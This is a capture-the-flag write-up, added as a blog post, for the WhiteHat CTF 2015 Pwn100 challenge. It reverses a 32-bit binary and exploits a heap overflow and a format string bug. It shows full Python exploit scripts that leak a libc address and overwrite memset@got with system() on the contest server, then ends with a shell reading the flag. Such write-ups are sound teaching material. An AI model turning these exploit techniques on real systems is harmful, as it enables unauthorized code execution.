@@ -1,0 +1,387 @@
+---
+layout: post
+title: "WhiteHat CTF 2015 Pwn100"
+date: 2015-07-25 20:43:22 -0400
+author: [barrebas, superkojiman]
+comments: true
+categories: [whitehat]
+---
+
+### Solved by barrebas and superkojiman
+
+This CTF lasted only twelve hours. This pwnable was worth 100 points but could've been way more! We're given a zip file containing a binary and the correspondig libc.so. How nice!
+
+```bash
+bas@tritonal:~/tmp/wh/pwn100$ file pwn100
+pwn100: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xce8e5ce254c2d733d19d9435903aff3656bef10e, not stripped
+bas@tritonal:~/tmp/wh/pwn100$ objdump -d -M intel --no-show-raw-insn ./pwn100 > pwn100.out
+```
+
+Running it:
+
+```bash
+bas@tritonal:~/tmp/wh/pwn100$ ./pwn100
+INPUT1
+INPUT2
+========
+T1Verify 1
+INPUT1
+
+T2Verify 1
+INPUT2
+
+========
+T1Verify 1
+INPUT1
+
+T2Verify 1
+INPUT2
+...etc...
+```
+
+It doesn't do a whole lot, it takes two strings as input and then starts looping. Superkojiman and I quickly realized we could crash this C++ application by sending more than 300 bytes as input. However, this made it crash in `strlen`:
+
+```bash
+bas@tritonal:~/tmp/wh/pwn100$ python -c 'print "A"*300+"\n"+"B"*300+"\n"' | ltrace ./pwn100
+__libc_start_main(0x8048747, 1, 0xffbfc5c4, 0x8048c20, 0x8048c90 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x804a054, 0xf77975e0, 0, 0xf76a7ff4, 0xf77560d0) = 0
+__cxa_atexit(0x80485d0, 0x804a054, 0x804a044, 0xf76a7ff4, 0xf77560d0) = 0
+malloc(10240)                                    = 0x081af008
+memset(0xffbfc10c, '\000', 1024)                 = 0xffbfc10c
+read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 1024) = 603
+strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)    = 603
+memset(0xffbfc10c, '\000', 1024)                 = 0xffbfc10c
+read(0, "", 1024)                                = 0
+strlen("")                                       = 0
+strlen("")                                       = 0
+memset(0x081af020, '\000', 0)                    = 0x081af020
+strlen("")                                       = 0
+memcpy(0x081af020, "", 0)                        = 0x081af020
+strlen("")                                       = 0
+strlen("")                                       = 0
+write(1, "========\n", 9========
+)                        = 9
+write(1, "T1", 2T1)                                = 2
+memset(0xffbfb8dc, '\000', 1024)                 = 0xffbfb8dc
+sprintf("Verify 0\n", "Verify %x\n", 0)          = 9
+write(1, "Verify 0\n", 20Verify 0
+)                       = 20
+memset(0xffbfb8dc, '\000', 1024)                 = 0xffbfb8dc
+strlen(NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+
+This is unfortunate. It actually combined our inputs and then decided to crash via a null pointer in `strlen`. We started investigating the binary in more detail. It fills two "Tag" structures on the heap with our input:
+
+```c
+int Tag::set_tag_content(char*)(int * arg_0) { 
+    eax = strlen(arg_4);
+    if (eax <= 0x201) goto loc_8048976;
+
+loc_8048a40:
+    esp = esp + 0x24;
+    ebx = stack[2047];
+    ebp = stack[2046];
+    return eax;
+
+loc_8048976:
+    if (*(arg_0 + 0x8) == 0x0) {
+            stack[2047] = 0x200;
+            *(arg_0 + 0x8) = Mem::get_mem(0x804a04c);
+    }
+    eax = *(arg_0 + 0x8);
+    eax = strlen(eax);
+    eax = memset(*(arg_0 + 0x8), 0x0, eax);
+    eax = strlen(arg_4);
+    eax = memcpy(*(arg_0 + 0x8), arg_4, eax); copied to heap?
+    var_C = 0x0;
+    goto loc_8048a14;
+
+loc_8048a14:
+    if (var_C < strlen(arg_4)) goto loc_80489ef;
+
+loc_8048a26:
+    eax = strlen(arg_4);
+    if (var_C == eax) {
+            eax = arg_0;
+            *(int16_t *)eax = 0x1;
+    }
+    goto loc_8048a40;
+
+loc_80489ef:
+    if (LOBYTE(*(int8_t *)(arg_4 + var_C) & 0xff) != LOBYTE(*(int8_t *)0x8048cb1 & 0xff)) goto loc_8048a10;
+
+loc_8048a06:
+    *(int16_t *)arg_0 = 0x0;
+    goto loc_8048a26;
+
+loc_8048a10:
+    var_C = var_C + 0x1;
+    goto loc_8048a14;
+}
+```
+
+It checks the length of the input to be less than or equal to 0x201 or 513 bytes. If it is larger, the structure on the heap is not filled (hence our crash in `strlen()`). The code at `loc_80489ef` checks our input for the `%` character... This hinted at a format string vulnerability!
+
+If there is no `%` character present, a flag in the structure on the heap will be set to `1`. If not, the flag will be `0`. This value is later checked and the binary will print: 
+
+```bash
+bas@tritonal:~/tmp/wh/pwn100$ ./pwn100
+%%
+AA
+========
+T1Verify 0
+%%
+
+ Not verify , content?
+```
+
+I call this flag "Tag::verify". I started playing around with the input and I was able to overwrite the verify flag of Tag2 using a buffer overflow in Tag1:
+
+```
+gdb-peda$ r
+% 
+%p
+========
+T1Verify 0
+%
+
+ Not verify , content?
+11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+T2Verify a
+%p
+
+ Not verify , content?
+```
+
+First, I sent an invalid Tag1 and Tag2 buffer, containing a `%` character. Then I get the option to send another input for Tag1. I submit 512*`1` plus a newline (which is `a` in hexadecimal). The newline ends up in Tag2::verify! 
+
+This means we can bypass the verification by overflowing Tag1 into Tag2::verify. I started a `socat` listener and started experimenting in a python script.
+
+```bash
+bas@tritonal:~/tmp/wh/pwn100$ socat TCP-LISTEN:6666,fork EXEC:./pwn100
+```
+
+```python
+from socket import *
+import struct, telnetlib, re, sys, time
+
+def readtil(delim):
+    buf = b''
+    while not delim in buf:
+        buf += s.recv(1)
+    return buf
+
+def p(x):
+    return struct.pack('<L', x & 0xffffffff)
+    
+def pwn():
+    global s
+    s=socket(AF_INET, SOCK_STREAM)
+    s.connect(('localhost', 6666))
+
+    # send invalid tag1
+    s.send("%"*511+"\x0a")
+    time.sleep(0.5)
+    # tag2 is also invalid, but we will bypass the protection
+    s.send("%08x-%08x-%08x-%08x-%08x-%08x\n")
+    
+    readtil('content?')
+    time.sleep(0.1)
+    # enable tag2 by overwriting Tag2::verified
+    # it will be printed using sprintf() even though it contains invalid chars \o/
+    s.send("%"*512+"\x01")
+    readtil('T2Verify 1')
+    
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+    s.close()
+pwn()
+```
+
+The offsets are taken from the output of `nm -D ./libc.so.6 | grep <function_name>`. 
+
+```bash
+bas@tritonal:~/tmp/wh/pwn100$ python poc1.py 
+
+00000400-083cb214-00000000-00000000-00000000-30303030
+
+========
+T1Verify 0
+...snip...
+```
+
+It works! We can bypass the string format protection by overflowing Tag1 into Tag2. Now things become interesting. We need a way to spawn a shell, so we need `system()`. However, ASLR is probably enabled, so we need to leak a libc address somehow. We can easily leak addresses with the string format vulnerability. Let's run it against the super slow remote server:
+
+```python
+from socket import *
+import struct, telnetlib, re, sys, time
+
+def readtil(delim):
+    buf = b''
+    while not delim in buf:
+        buf += s.recv(1)
+    return buf
+
+def p(x):
+    return struct.pack('<L', x & 0xffffffff)
+    
+def pwn():
+    global s
+    s=socket(AF_INET, SOCK_STREAM)
+    #s.connect(('localhost', 6666))
+    s.connect(('lab33.wargame.whitehat.vn', 10100))
+    
+    # send invalid tag1
+    s.send("%"*511+"\x0a")
+    time.sleep(0.5)
+    # tag2 is also invalid, but we will bypass the protection
+    # leak write@got
+    s.send(p(0x804a01c)+"%6$s\n")   # 0x804a01c = write@got
+    
+    readtil('content?')
+    time.sleep(0.1)
+    # first, enable tag2 by overwriting Tag2::verified
+    # it will be printed using sprintf() even though it contains invalid chars \o/
+    s.send("%"*512+"\x01")
+    readtil('T2Verify 1')
+    # receive crap from format string
+    s.recv(16)  
+    # receive actual information, contains leaked got pointers
+    data = s.recv(100)  
+    libc_write = struct.unpack('<I', data[:4])[0]
+    
+    # remote
+    print "[+] Leaked write    : " + hex(libc_write)
+    libc_base = libc_write - 0x000d9510 
+    print "[+] libc base addr  : " + hex(libc_base)
+    libc_rce = libc_base + 0x003fcd0 # system
+    print "[+] libc system addr: " + hex(libc_rce)
+
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+    s.close()
+pwn()
+```
+
+```bash
+bas@tritonal:~/tmp/wh/pwn100$ python poc1.py 
+[+] Leaked write    : 0xf7607510
+[+] libc base addr  : 0xf752e000
+[+] libc system addr: 0xf756dcd0
+
+========
+T1Verify 0
+...snip...
+```
+
+Looks good, right? Now, the trick is to _invalidate_ Tag2 again, so we can set it to a new format string, then revalidate it again. The new format string will take care of overwriting a GOT pointer with our acquired `system()` address. 
+
+I chose to overwrite `memset@got` with `system()`. One of the arguments to memset is the buffer which contains our input. By overwriting memset with system, the next time memset is called, we'll effectively run system(our_input)!
+
+```python
+from socket import *
+import struct, telnetlib, re, sys, time
+
+def readtil(delim):
+    buf = b''
+    while not delim in buf:
+        buf += s.recv(1)
+    return buf
+
+def p(x):
+    return struct.pack('<L', x & 0xffffffff)
+    
+def pwn():
+    global s
+    s=socket(AF_INET, SOCK_STREAM)
+    #s.connect(('localhost', 6666))
+    s.connect(('lab33.wargame.whitehat.vn', 10100))
+    
+    # send invalid tag1
+    s.send("%"*511+"\x0a")
+    time.sleep(0.5)
+    # tag2 is also invalid, but we will bypass the protection
+    # leak write@got
+    s.send(p(0x804a01c)+"%6$s\n")   # 0x804a01c = write@got
+    
+    readtil('content?')
+    time.sleep(0.1)
+    # first, enable tag2 by overwriting Tag2::verified
+    # it will be printed using sprintf() even though it contains invalid chars \o/
+    s.send("%"*512+"\x01")
+    readtil('T2Verify 1')
+    # receive crap from format string
+    s.recv(16)  
+    # receive actual information, contains leaked got pointers
+    data = s.recv(100)  
+    libc_write = struct.unpack('<I', data[:4])[0]
+    
+    # remote
+    print "[+] Leaked write    : " + hex(libc_write)
+    libc_base = libc_write - 0x000d9510 
+    print "[+] libc base addr  : " + hex(libc_base)
+    libc_rce = libc_base + 0x003fcd0 # system
+    print "[+] libc system addr: " + hex(libc_rce)
+
+    # invalidate t2 again by overflowing t1 into Tag::verified, so we can set it to a new value
+    readtil('content?')
+    s.send("%"*512+"\x00")
+    
+    # calculate the magic constants for the string format attack
+    # don't stare too long at them or you'll go blind
+    magic1 = ((0x100 + (libc_rce & 0xff)) - 12) & 0xff
+    magic2 = ((0x100 + (libc_rce >> 8) & 0xff) - (libc_rce & 0xff)) & 0xff
+    magic3 = ((0x100 + (libc_rce >> 16) & 0xff) - ((libc_rce >> 8) & 0xff)) & 0xff
+    
+    # send new t2
+    readtil('content?')
+    
+    # ugly format string will write out address of system() into memset@got byte-by-byte
+    s.send(p(0x804a020)+p(0x804a021)+p(0x804a022)+"%"+str(magic1)+"c%6$hhn%"+str(magic2)+"c%7$hhn%"+str(magic3)+"c%8$hhn\n")    # 0x804a01c = write@got
+    readtil('content?')
+    
+    # validate t2 by sending an invalid t1
+    s.send("%"*512+"\x01")
+    s.recv(100)
+    
+    # we now get another shot at sending a correct t1,
+    # however, memset is overwritten with system(), so now it should spawn a shell
+    s.send('/bin/sh\x0a')
+    
+    print "[+] Enjoy your shell!"
+    
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+    s.close()
+pwn()
+```
+
+Let's run it against the remote system:
+
+```bash
+bas@tritonal:~/tmp/wh/pwn100$ python poc1.py 
+[+] Leaked write    : 0xf75c0510
+[+] libc base addr  : 0xf74e7000
+[+] libc system addr: 0xf7526cd0
+[+] Enjoy your shell!
+T2Verify 1
+...snip...
+T1sh: 1: Syntax error: Unterminated quoted string
+Verify 0
+        sh: 1: Verify: not found
+/bin/sh
+...snip...
+ Not verify , content?
+id
+uid=1002 gid=1002
+cat /home/*/flag  
+WhiteHat{786fdd7b4ed544a186e6457a4c24fe8a95a67bbc}
+```
+
+A lot of crap is printed, but in the end we land our shell!
+
